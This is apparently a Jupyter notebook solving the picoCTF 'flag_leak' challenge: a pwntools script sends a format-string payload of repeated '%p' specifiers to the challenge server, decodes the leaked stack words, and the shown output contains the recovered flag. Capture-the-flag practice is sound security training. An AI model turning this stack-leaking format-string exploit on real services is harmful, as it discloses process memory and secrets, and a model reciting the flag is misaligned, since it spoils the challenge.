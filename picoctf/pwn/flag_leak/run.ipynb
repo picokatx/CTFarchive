{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[x] Opening connection to saturn.picoctf.net on port 61587\n",
      "[x] Opening connection to saturn.picoctf.net on port 61587: Trying 13.59.203.175\n",
      "[+] Opening connection to saturn.picoctf.net on port 61587: Done\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "b'\\xd0u\\xfb\\xff\\xf0u\\xfb\\xffF\\x93\\x04\\x08%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p\\x00\\xf4picoCTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}\\x00 \\xad\\xfb\\x909\\xa7\\xf4\\x00\\xc0\\x04\\x08\\x00\\xc0\\x04\\x08\\xb8v\\xfb\\xff\\x18\\x94\\x04\\x08\\x02dw\\xfb\\xff'"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from pwn import *\n",
    "r = remote('saturn.picoctf.net', 61587)\n",
    "r.recvuntil(b\"Tell me a story and then I'll tell you one >> \")\n",
    "r.sendline(b\"%p\"*63)\n",
    "r.recvuntil(b\"Here's a story - \\n\")\n",
    "out = r.recvline()\n",
    "stack = []\n",
    "for b in re.findall(\"[0-9a-f]+0x\", out.decode()):\n",
    "    if len(b[:-2])%2 != 0:\n",
    "        b = \"0\" + b\n",
    "    stack.append(bytes.fromhex(b[:-2])[::-1])\n",
    "b\"\".join(stack)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
